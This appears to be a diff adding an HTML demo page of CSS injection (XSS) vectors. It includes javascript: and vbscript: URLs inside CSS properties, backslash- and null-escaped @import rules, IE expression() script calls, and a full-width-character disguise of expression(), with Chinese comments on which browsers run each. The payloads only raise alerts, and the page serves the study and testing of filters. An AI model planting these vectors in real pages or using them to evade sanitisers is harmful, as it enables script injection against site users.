@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>CSS注入示例</title>
+	<style type="text/css">
+		body {
+			background-image: url(vbscript:msgbox(2));		
+		}	
+
+		BODY {
+			BACKGROUND-IMAGE: URL('JAVASCRIPT:ALERT(2);');		
+		}	
+
+		li {
+			list-style-image: url('javascript:alert(3)');
+		}
+
+	</style>
+
+	<style>
+		@i\mp\ort url('1.css');		/* google ie都可以 */
+		@imp\000ort url('2.css');   /* ie <=ie7执行, google不执行 */
+	</style>
+
+	<style>
+		a {
+			/* v<=ie7 */
+			text: expression(this.target="_blank");
+		}
+
+		a {
+			/*  v<=ie7, 不断弹窗 */
+			/* text: expression(alert('expression1')); */
+		}
+
+		a {
+			
+			text: expression(if(window.x!=1){alert('expression2');x=1;});
+		}
+	</style>
+
+	<style>
+		p {
+			xss: expｒｅｓｓｉon(if(window.x!=3){alert('expression3');x=3;}) ;
+		}
+	</style>
+</head>
+<body>
+	<a href="https://www.baidu.com">baidu</a>
+	<p>test full width expression </p>
+</body>
+</html>
